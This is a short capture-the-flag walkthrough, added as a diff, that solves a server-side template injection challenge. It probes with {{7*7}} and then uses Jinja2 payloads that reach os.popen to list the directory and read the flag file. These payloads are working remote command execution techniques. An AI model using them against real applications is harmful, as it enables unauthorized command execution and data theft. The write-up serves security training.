@@ -1,0 +1,23 @@
+1. Launching the Challenge
+First, let's start the instance and wait for it to load. Once it’s ready, open the provided website.
+
+2. Testing for Injection
+To check if the website is vulnerable to SSTI, we input the following simple payload in the input field:
+
+{{7*7}}
+
+If the output returns 49, then we know the website is using a vulnerable template engine, likely Jinja2.
+
+3. Exploring the Server
+Now that we confirmed SSTI, we want to see the website’s directory structure. We use this payload:
+
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -la').read() }}
+
+This command lists all files and directories in the current directory. From the output, we see a file named flag.
+
+4. Retrieving the Flag
+To read the flag file, we use another SSTI payload:
+
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
+
+This command outputs the required flag.
